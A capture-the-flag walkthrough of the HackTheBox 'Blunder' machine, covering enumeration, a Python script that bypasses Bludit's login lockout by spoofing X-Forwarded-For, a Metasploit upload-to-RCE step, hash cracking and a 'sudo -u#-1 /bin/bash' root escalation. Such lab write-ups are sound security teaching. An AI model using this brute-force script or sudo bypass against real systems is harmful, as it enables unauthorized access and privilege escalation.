This machine from HackTheBox is categorized as an “easy” Linux
machine.
The machine is hosting a website with Bludit CMS version 3.9.2.
The Bludit installation has security flaws that make’s it possible to get a remote shell for the user www-data. Bludit has a parallel installation on the server. From this installation I found a SHA1 hash for the account Hugo. Hugo is a user account on the server as well, and the password from the SHA1 hash is also the password for Hugo’s local account. There is a misconfigured setting for the user Hugo that makes it possible to escalate to root.

## [](#header-2)Enumeration

### [](#header-3)Nmap
I started with an nmap scan to get a list of running services on the machine.
```
Nmap -sC -sV -oA nmap 10.10.10.191
```

I noticed only two open ports on the system, port 21 and 80. The webserver is hosting a website.

### [](#header-3)Gobuster
Gobuster is a tool that can be used to enumerate a website by
guessing what content is placed on the webserver. I ran the the
following command to start gobuster with one of my built-in
wordlists in Kali Linux:

```
gobuster dir w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.191/ -x php,html,txt
```

```
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/install.php (Status: 200)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
/usb (Status: 200)
/LICENSE (Status: 200)
```

##### [](#header-5)Todo.txt
The file todo.txt seems to be something that is unusual. The
content of the file is the following:
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images – PENDING
This information might be useful in a later stage.

##### [](#header-5)Robots.txt
The robots file is a file that gives instructions to search
engines such as Google and Bing etc. The instructions might be to exclude content from the website.
Robots.txt on this web server doesn't give any further useful information.

##### [](#header-5)/admin
Visiting http://10.10.10.191/admin in the web browser shows me that this site uses Bludit CMS, and also ask me to login.

## [](#header-2)Exploitation

### [](#header-3)Cewl
At this stage I dont have any credentials to use to login to the
CMS. From the text file todo.txt I got a name, fergus. This is not
enough, I still need some passwords to try login.
Cewl is a tool that indexes a web site with all text and writes it
to a file, one line per word.

```
Cewl -m 5 10.10.10.191 -w cewl.txt
```

This command gives me all text on the website, with minimum 5
chars and saves it to the file cewl.txt. With this information I
can use this to try to login. The cewl.txt has 188 lines so it
will take time to try everyone manually. The Bludit CMS also have
a function that locks out the IP-address, if more than 10 tries
fails.

### [](#header-3)Bludit Brute Force Migitation Bypass
Bludit has a configuration in the file security.class.php that
locks the user out after 10 tries. I found a solution to bypass
this configuration online from a Security Researcher, <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/" target="_blank">rastating</a>.
Rastating writes about the problem and also provides a python-
script as a Proof Of Concept. By running a modified version of
this script with the assumption that the valid username is
“fergus”, I was able to find a matching password,
“RolandDeschain”, from the wordlist made by cewl earlier.
Now I was able to use the credentials to log on to the system.

#### [](#header-4)The modified script

```
#!/usr/bin/env python3
import re
import requests

host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
	wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
	session = requests.Session()
	login_page = session.get(login_url)
	csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',
login_page.text).group(1)

	print('[*] Trying: {p}'.format(p = password))

	headers = {
		'X-Forwarded-For': password,
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',

		'Referer': login_url
	}

	data = {
		'tokenCSRF': csrf_token,
		'username': username,
		'password': password,
		'save': ''
	}

	login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

	if 'location' in login_result.headers:
		if '/admin/dashboard' in login_result.headers['location']:
			print()
			print('SUCCESS: Password found!')
			print('Use {u}:{p} to login.'.format(u = username, p = password))
			print()
			break
```

### [](#header-3)Bludit_upload_images_exec - MetaSploit
There is a vulnerability in the image upload function what in
short terms means that an attacker can upload a malicious payload
file and get remote code execution.
There is a module added to MetaSploit that executes this attack.

With this exploit, using the credentials from before, I was able
to get a shell back for the user www-data.

### [](#header-3)SHA1 hash
From the folder /var/www/ I saw that there is another Bludit
installation on the server. Bludit-3.10.0a.

![](Pictures/Blunder/var-www.png)

Inside the folder /var/www/bludit-3.10.0a/bl-content/databases is
a file named users.php. The file contains information about the
user Hugo.

![](Pictures/Blunder/users.png)

The password shown in the picture is the SHA1 hash for the user
Hugo. The hash was cracked and the password is: Password120
I was now able to change user to Hugo.

![](Pictures/Blunder/user.png)

And here is the user.txt flag.

### [](#header-3)Privilege escalation
I did some enumeration to see if Hugo is able to perform commands
as root.

![](Pictures/Blunder/sudo-l.png)

With this knowledge I can use an technique to trick the system
that Im allowed to run bash as root.

```
sudo -u#-1 /bin/bash
```

This gives me a root shell and I was able to get the root.txt
flag.
